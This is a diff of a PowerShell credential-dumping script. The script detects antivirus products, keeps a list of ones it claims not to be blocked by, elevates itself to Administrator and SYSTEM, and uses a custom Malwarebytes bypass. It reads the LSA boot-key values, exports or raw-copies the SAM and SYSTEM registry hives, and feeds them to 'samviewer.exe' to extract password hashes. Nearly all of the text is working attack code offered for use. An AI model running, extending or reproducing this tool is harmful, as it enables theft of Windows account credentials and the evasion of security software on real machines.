@@ -1,6 +1,7 @@
 # TODO:
 # CLEAN UP CODE
 # ADD PER -AV BYPASS
+$TestedAVs = @("Windows Defender", "Sophos Intercept X", "Sophos Anti-Virus", "Avast Antivirus", "Malwarebytes", "AVG Antivirus")
 $av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
 
 $hasThirdPartyAV = [bool]($av | Where-Object {
@@ -15,8 +16,14 @@ if ($hasThirdPartyAV) {
     $BgRed = "${Esc}[41m"
     $BgBrightWhite = "${Esc}[107m"
     $BrightWhite = "${Esc}[97m"
+    $BgBrightBlack = "${Esc}[100m"
+
     Write-Host "$BgBrightWhite$Bold$Red THIRD-PARTY ANTIVIRUS DETECTED $Reset"
-    Write-Host "The AntiVirus $BgRed$BrightWhite$Bold$($avName)$Reset is Installed, it will most likely block the execution of this script"
+    if ($avName -in $TestedAVs) {
+        Write-Host "The AntiVirus $BgRed$BrightWhite$Bold$($avName)$Reset is Installed,`nThis antivirus has been already tested and $bold$BrightWhite$($BgRed)SHOULDN'T$($reset) cause any problem.`nif it does cause problems: contact me at $($BgBrightBlack)$($BrightWhite)303entity303@proton.me$($Reset) "
+    } else {
+        Write-Host "$($Red)WARNING$($Reset): The AntiVirus $BgRed$BrightWhite$Bold$($avName)$Reset is Installed,`nThis antivirus has $bold$BrightWhite$($BgRed)NOT$($Reset) been tested and $bold$BrightWhite$($BgRed)COULD$($reset) cause prevent the execution of the script.`n in any case please send a mail to $($BgBrightBlack)$($BrightWhite)303entity303@proton.me$($Reset) saying if it worked or not"
+    }
 }
 # Get current identity
 $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -28,9 +35,8 @@ $workingDir = Split-Path $scriptPath
 $nsudoPath = Join-Path $workingDir "NSudoLC.exe"
 
 # Relaunch as Administrator if needed
-Write-Host "launching as admin"
-Start-Sleep -Seconds 1
 if (-not $isAdmin) {
+    Write-Host "Relaunching as Admin"
     $arguments = @(
         '-NoExit',
         '-ExecutionPolicy', 'Bypass',
@@ -44,10 +50,9 @@ if (-not $isAdmin) {
 
     exit
 }
-Write-Host "launching as system"
-Start-Sleep -Seconds 1
 if ($avName -match "malwarebytes") {
     if (-not $isSystem) {
+        Write-Host "Relaunching as system"
         $arguments = "Set-Location '$workingDir'; & '$scriptPath'"
 
         & $nsudoPath -U:S -P:E powershell.exe `
@@ -60,16 +65,13 @@ if ($avName -match "malwarebytes") {
 }
 
 
-Write-Host "loading typedef"
 if ($avName -match "malwarebytes") {
     Write-Host "Since Malwarebytes has been detected a specific custom bypass will be used "
     $dllPath = Join-Path $PSScriptRoot 'RawDiskNative.dll'
-    Start-Sleep -Seconds 1
     if (-not (Test-Path -LiteralPath $dllPath)) {
         throw "Missing RawDiskNative.dll: $dllPath"
     }
 
-    Start-Sleep -Seconds 1
     if (-not ("RawDiskNative" -as [type])) {
         [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
     }
@@ -410,11 +412,6 @@ if ($avName -match "malwarebytes") {
     if (-not ("RegClass" -as [type])) {
         [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
     }
-    Write-Host "sig added"
-    Start-Sleep -Seconds 1
-
-    Write-Host "type added"
-    Start-Sleep -Seconds 1
     function Get-RegClass($hive, $path) {
         $k = $hive.OpenSubKey($path)
         if (-not $k) { throw "Cannot open $path - run as SYSTEM?" }
@@ -428,8 +425,7 @@ if ($avName -match "malwarebytes") {
         $k.Close()
         return $class.ToString()
     }
-    Write-Host "getting 4 keys"
-    Start-Sleep -Seconds 1
+    
     $hive = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
         [Microsoft.Win32.RegistryHive]::LocalMachine,
         [Microsoft.Win32.RegistryView]::Registry64
@@ -439,23 +435,20 @@ if ($avName -match "malwarebytes") {
     $GBG = Get-RegClass $hive "System\CurrentControlSet\Control\Lsa\GBG"
     $DATA = Get-RegClass $hive "System\CurrentControlSet\Control\Lsa\DATA"
     $SKEW1 = Get-RegClass $hive "System\CurrentControlSet\Control\Lsa\Skew1"
-    Set-Content C:\test.txt -Value "jd=$JD gbg=$GBG data=$DATA skew1=$SKEW1"
     $hive.Close()
-    Write-Host "JD=$JD GBG=$GBG DATA=$DATA SKEW1=$SKEW1"
     $extract_arguments = "--jd $JD --skew1 $SKEW1 --gbg $GBG --data $DATA"
-    reg export HKEY_LOCAL_MACHINE\SAM test12.reg /y
+    reg export HKEY_LOCAL_MACHINE\SAM test12.reg /y | Out-Null
     $extract_arguments += " --reg test12.reg"
-    Start-Process -FilePath "cmd.exe" -ArgumentList "/k `" .\samviewer.exe` $extract_arguments"
 } else {
-    New-Item -ItemType Directory -Name reg_Workaround_bypass_hives
+    Remove-Item reg_Workaround_bypass_hives -Force -ErrorAction SilentlyContinue -Recurse
+    New-Item -ItemType Directory -Name reg_Workaround_bypass_hives | Out-Null
 
     Write-Host "Extracting SYSTEM..."
-    Read-RawFileBytes -Path C:\Windows\System32\config\SYSTEM -OutFile $workingDir/reg_Workaround_bypass_hives/SYSTEM
+    Read-RawFileBytes -Path C:\Windows\System32\config\SYSTEM -OutFile $workingDir/reg_Workaround_bypass_hives/SYSTEM | Out-Null
 
     Write-Host "Extracting SAM..."
-    Read-RawFileBytes -Path C:\Windows\System32\config\SAM -OutFile $workingDir/reg_Workaround_bypass_hives/SAM
+    Read-RawFileBytes -Path C:\Windows\System32\config\SAM -OutFile $workingDir/reg_Workaround_bypass_hives/SAM | Out-Null
     
     $extract_arguments += " --hive $workingDir/reg_Workaround_bypass_hives"
 }
-Write-Host $extract_arguments
 Start-Process -FilePath "cmd.exe" -ArgumentList "/k `" .\samviewer.exe` $extract_arguments"
